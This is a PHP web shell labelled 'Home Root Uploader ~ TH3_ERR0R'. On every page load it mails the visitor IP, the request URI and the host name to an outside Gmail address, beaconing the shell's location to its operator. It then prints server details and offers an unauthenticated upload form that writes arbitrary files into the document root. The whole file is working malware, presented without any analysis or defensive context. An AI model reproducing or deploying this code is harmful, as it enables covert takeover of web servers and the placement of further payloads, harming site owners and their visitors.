<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " Shell Priv |$ip";
$email = "therrr6@gmail.com";
$from = "From: Priv@Bot.com";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>
<?php
echo "Home Root Uploader ~ TH3_ERR0R<br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='file'>
	  <input type='submit' name='upload' value='UPload File'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "uploaded ~> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "upload failed";
		}
	} else {
		if(@copy($_FILES['file']['tmp_name'], $files)) {
			echo "uploaded <b>$files</b> in this folder";
		} else {
			echo "upload failed";
		}
	}
}
?>
